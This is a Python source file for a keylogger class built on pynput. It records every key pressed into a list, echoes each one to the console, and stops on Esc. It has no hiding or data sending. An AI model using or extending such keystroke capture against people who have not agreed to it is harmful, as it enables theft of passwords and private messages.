from pynput import keyboard
from IKeyLogger import IKeyLogger


class KeyLoggerService(IKeyLogger):
    def __init__(self):
        self.running = False
        self.listener = None
        self.list_data = []

    def on_press(self, key):
        try:
            if key == keyboard.Key.esc:
                print(" stopping keylogger...")
                self.stop_logging()
                return

            key_str = key.char if hasattr(key, 'char') else str(key)
            if key_str:
                self.list_data.append(key_str)
                print(f" pressed  : {key_str}")
        except Exception as e:
            print(f"error: {e}")

    def start_logging(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.running = False
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        return self.list_data

    def clear_data(self):
        self.list_data = []
